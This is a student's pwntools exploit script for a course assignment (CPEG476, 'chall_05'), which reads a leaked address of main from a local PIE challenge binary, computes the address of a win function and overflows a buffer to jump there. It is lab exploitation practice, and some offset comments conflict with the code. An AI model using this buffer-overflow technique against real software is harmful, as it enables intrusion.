'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_05
File Description:  Using a call to rax to call the win function, move 8 bytes to rax, PIE on and prints on main

Since printing main, can offset how far WIN function is, which is 17 away in hex

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   70) Symbols       No    0               2               chall_05

File info:
chall_05: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=429a18a195d1ca2ea2ec1c8bd229ed582dcf6027, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions


'''

# Import libraries
from pwn import *

# Start Process and get leak?
p=process("./chall_05")
resp=p.recvuntil(b"is: ")
leak=p.recvuntil(b"\n")
print(leak)

# Create payload
intleak = int(leak,16)  #random address created from pie
intleak = intleak - 23  # Win is 23 bytes above main func call
leakaddr = p64(intleak) # executable is 64 bit so
print(leakaddr)
offset=b'a'*88   # 96 to eip, 4 or 8 for rip?
payload=offset+leakaddr
print(payload)

p.sendline(payload)#for nice unprintable payloads
p.interactive()